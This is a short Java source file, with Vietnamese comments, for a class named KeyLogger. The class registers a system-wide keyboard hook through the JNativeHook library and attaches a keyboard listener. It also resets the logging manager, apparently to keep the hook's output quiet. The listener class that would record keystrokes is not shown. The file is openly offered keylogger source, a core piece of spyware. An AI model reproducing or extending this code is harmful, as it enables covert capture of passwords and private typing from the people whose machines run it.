package keylog;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
//import org.jnativehook.keyboard.NativeKeyListener;

import java.util.logging.LogManager;
//Tao Keylogger
//Gan Hook vao hang doi
public class KeyLogger {
	public static NativeKeyboard KeyBoard = new NativeKeyboard();
	
	public void startKeyLogger() {
		try {
			//Dang ky Hook tren toan he thong
			GlobalScreen.registerNativeHook();
		}//Neu khong dang ky duoc thi bat exception
		catch (NativeHookException e)
		{
			e.printStackTrace();
		}
		GlobalScreen.addNativeKeyListener(KeyBoard);
	    LogManager.getLogManager().reset();
	}
}
